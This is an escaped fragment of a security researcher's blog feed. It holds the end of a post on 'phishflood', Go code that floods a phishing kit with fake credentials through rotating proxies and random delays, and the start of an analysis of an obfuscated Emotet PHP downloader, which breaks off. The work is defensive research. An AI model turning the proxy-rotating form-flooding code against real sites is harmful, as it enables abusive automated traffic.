&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; int(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Intn&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;)
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sleep&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Duration&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Millisecond&lt;/span&gt;)

	    &lt;span style=&#34;color:#75715e&#34;&gt;// send requests with fake data
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flood&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;)
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// when POST request is completed, print the status code from the channel
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#a6e22e&#34;&gt;routines&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;)
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A small delay between 10 and 2 seconds is introduced in the for loop. Ideally, this delay should be higher, to not make it obvious that these POST requests were automated.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;flood&lt;/code&gt; function needs a list of proxy addresses (&lt;code&gt;px&lt;/code&gt; in the code below), which are used to make the requests without showing our IP address in the kit.
The fake data which are going to be submitted are contained in &lt;code&gt;vals&lt;/code&gt; and populated in a not sophisticated way: since all the input types are &lt;code&gt;number&lt;/code&gt; for this kit, it is sufficient to create random numbers between a sufficiently long interval.&lt;/p&gt;
&lt;p&gt;In Go, it is possible to create random number between an interval in the following way:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;randomnumber&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Intn&lt;/span&gt;( &lt;span style=&#34;color:#a6e22e&#34;&gt;max&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;min&lt;/span&gt; ) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;min&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The input field with the name &lt;code&gt;cellulare&lt;/code&gt; needed particular attention: &lt;em&gt;&amp;ldquo;cellulare&lt;/em&gt;&amp;rdquo; stands for &lt;em&gt;&amp;ldquo;mobile phone&amp;rdquo;&lt;/em&gt; in italian, so the interval for the random generation is a bit more complicated.&lt;/p&gt;
&lt;p&gt;After the POST request, the status code is sent to the channel, and the goroutine terminate its execution.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flood&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) {

    &lt;span style=&#34;color:#75715e&#34;&gt;// make post request using proxy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;proxyURL&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Parse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;px&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;len(&lt;span style=&#34;color:#a6e22e&#34;&gt;px&lt;/span&gt;)])
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Stderr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error parsing the proxy address\n&amp;#34;&lt;/span&gt;)
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    }

    &lt;span style=&#34;color:#a6e22e&#34;&gt;myClient&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Timeout&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Transport&lt;/span&gt;:
	    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Transport&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Proxy&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProxyURL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;proxyURL&lt;/span&gt;)}}

    &lt;span style=&#34;color:#75715e&#34;&gt;// generate fake data
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Values&lt;/span&gt;{}
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;valName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt; {

	    &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#34;cellulare&amp;#34; is &amp;#34;mobile phone&amp;#34; in italian, so we
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;// have a particular interval to make it realistic
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;valName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cellulare&amp;#34;&lt;/span&gt; {
		    &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Intn&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3499999999&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3200000000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3200000000&lt;/span&gt;
		    &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;valName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt;))

	    &lt;span style=&#34;color:#75715e&#34;&gt;// these are generic numbers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;number&amp;#34;&lt;/span&gt; {
		    &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Intn&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;99999999&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000000&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10000000&lt;/span&gt;
		    &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;valName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt;))
	    }
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// make the POST request
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PostForm&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;// print error
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {

	    &lt;span style=&#34;color:#75715e&#34;&gt;// send to the channel the status code of the POST
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Request #%d with these parameters {codice: %s,&amp;#34;&lt;/span&gt;,
		    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cellulare: %s, password: %s} returned the following status code:&amp;#34;&lt;/span&gt;,
		    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d %s.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;codice&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cellulare&amp;#34;&lt;/span&gt;),
		    &lt;span style=&#34;color:#a6e22e&#34;&gt;vals&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;StatusCode&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;StatusText&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;StatusCode&lt;/span&gt;))
	    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;results-and-possible-improvements&#34;&gt;Results and possible improvements&lt;/h2&gt;
&lt;p&gt;If we run the code above specifying a URL, we should see something like this:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishflood/phishflood.png&#34;
         alt=&#34;Output of phishflood&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Output of phishflood&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Depending on the status of the proxies, we may have some timeout errors. However, when I checked the logs of the kit I was able to find our fake data:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishflood/logs.png&#34;
         alt=&#34;Logs on the phishing page&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Logs on the phishing page&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The main limitation of this poc is that is only compatible with these kinds of phishing kits. Two possible improvements are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fake data generation for different types of input fields. Many phishing kits are targeting email credentials, or credit cards number, the library &lt;a href=&#34;https://github.com/bxcodec/faker&#34;&gt;faker&lt;/a&gt; could help in the generation of these data.&lt;/li&gt;
&lt;li&gt;Handling multiple forms. Some phishing kits ask the user to fill different forms, and sometimes the second form is accessible only if the first one is submitted. A possible approach to overcome this would be to continue submitting form with fake data as long as there is not a redirection or no more forms are found.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this post we saw how to create a proof of concept to pollute with fake data the credentials stolen with a phishing kit.
There is a lot of space for improvements, but, after checking the logs of the kit, I consider the proof of concept successful as it is.&lt;/p&gt;
&lt;p&gt;If you want to play around with &lt;code&gt;phishflood&lt;/code&gt; you can use this &lt;a href=&#34;https://github.com/andpalmier/phishflood/&#34;&gt;GitHub repo&lt;/a&gt;, I have organized the code and added some improvements. Feel free to let me know what features could be added.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Emotet infection from PHP: generation of a malicious doc</title>
      <link>/posts/emotet-php-maldoc/</link>
      <pubDate>Mon, 12 Oct 2020 10:33:45 +0200</pubDate>
      
      <guid>/posts/emotet-php-maldoc/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;During 2020, the Emotet malware distribution was silent between the beginning of February and the middle of July; this was the longest known break for Emotet. After this pause, the email campaigns started again, with multiple vendors reporting that hundreds of thousands of messages were detected every day&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;p&gt;There is a long list of security researchers on Twitter that are interested in Emotet, with many accounts sharing samples and findings every day. During this summer I started writing multiple threads reporting abused &amp;ldquo;.it&amp;rdquo; domains which were used to distribute this malware. While I was working on one of this daily threads, I found something interesting:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/emotet/indexof.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;This domain was reported in multiple occasions during the summer, and it was seen for the first time at the end of July:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/emotet/firsttime.png&#34;
         alt=&#34;Screenshot from URLhause&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Screenshot from &lt;a href=&#34;https://urlhaus.abuse.ch/url/420080/&#34;&gt;URLhause&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;I downloaded &lt;code&gt;malware.zip&lt;/code&gt; and extracted the content. Although the PHP file in this archive is not detected as malicious in VirusTotal, it is actually used to download a document which contains malicious macros that will attempt to infect the machine.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;The Emotet malware was firstly identified in 2014. At that time it was acting as a banking malware, attempting to steal sensitive data; however, during these years, several features were added such as the malspam distribution and the further installation of other malware.
Emotet is currently considered one of the most costly threats, affecting not only individuals, but also private organizations, and even governments.&lt;/p&gt;
&lt;p&gt;The primary distribution method for Emotet is through malspam: the malware is able to detect the contacts list of the infected machine and to replicate itself by sending emails to these contacts. In addition, since the email will be sent from an hijacked account, these will look less suspicious to the recipients.&lt;/p&gt;
&lt;p&gt;The infection methods are multiple: malicious links, document containing macros or scripts. In this case, we will take a look at a PHP file which generates a malicious document file containing macros to infect the machine.&lt;/p&gt;
&lt;h2 id=&#34;analysis-of-the-php-downloader&#34;&gt;Analysis of the PHP downloader&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;malware.zip&lt;/em&gt; contains a single PHP file (&lt;code&gt;index.php&lt;/code&gt;), which reports August 25th as a modification date. Before analyzing the PHP file, it&amp;rsquo;s worth noting that only the archive &lt;em&gt;malware.zip&lt;/em&gt; is found on VirusTotal, with 0 detections for the multiple engines and the first submission from September 26th.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/emotet/vtzip.png&#34;
         alt=&#34;malware.zip on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/db1617dc4a09fe856aea8041b90e73467e8d51ad4bdc1fd9a7e0a3197e66339c/detection&#34;&gt;malware.zip on VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The PHP file, instead, has 0 matches.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/emotet/vtphp.png&#34;
         alt=&#34;index.php on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/a48791d0e22ba693529285555ebb559bac1786bd703406deb5e1ef9ee8616cc4/detection&#34;&gt;index.php on VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h3 id=&#34;basic-string-obfuscation&#34;&gt;Basic string obfuscation&lt;/h3&gt;
&lt;p&gt;The first function that should be discussed in this analysis is called &lt;code&gt;d5f44d5a7878a4()&lt;/code&gt;. Indeed, &lt;code&gt;index.php&lt;/code&gt; contains some obfuscated strings to avoid being detected as malicious, and this function is used to de-obfuscate these strings. Here is the content of the function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;($s) {
    $string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;base64_decode&lt;/span&gt;($s);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;explode&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;::&amp;#39;&lt;/span&gt;, $string, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that it was used a very basic obfuscation technique. The de-obfuscation function decodes the given string with Base64 and proceed to create an array of strings by splitting the decoded string on the following sequence of characters &lt;em&gt;&amp;quot;::&amp;quot;&lt;/em&gt;. The return value of &lt;code&gt;d5f44d5a7878a4()&lt;/code&gt; is contained in the second element of the array obtained after the split.&lt;/p&gt;
&lt;p&gt;For instance, &lt;code&gt;d5f44d5a7878a4()&lt;/code&gt; is called later in the file in this way:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$qString &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TGhDY1VXdENMUT09OjpRVUVSWV9TVFJJTkc=&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Decoding &lt;em&gt;&amp;ldquo;TGhDY1VXdENMUT09OjpRVUVSWV9TVFJJTkc=&amp;quot;&lt;/em&gt; with Base64 we obtain &lt;em&gt;&amp;ldquo;LhCcUWtCLQ==::QUERY_STRING&amp;rdquo;&lt;/em&gt;, thus the variable &lt;code&gt;$qString1&lt;/code&gt; will contain &lt;em&gt;&amp;ldquo;QUERY_STRING&amp;rdquo;&lt;/em&gt;.&lt;/p&gt;
&lt;h3 id=&#34;entry-point&#34;&gt;Entry point&lt;/h3&gt;
&lt;p&gt;The entry point of &lt;code&gt;index.php&lt;/code&gt; is represented by the &lt;code&gt;p5f44d5a786a7c()&lt;/code&gt; function. Here are the very first lines:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p5f44d5a786a7c&lt;/span&gt;()
{
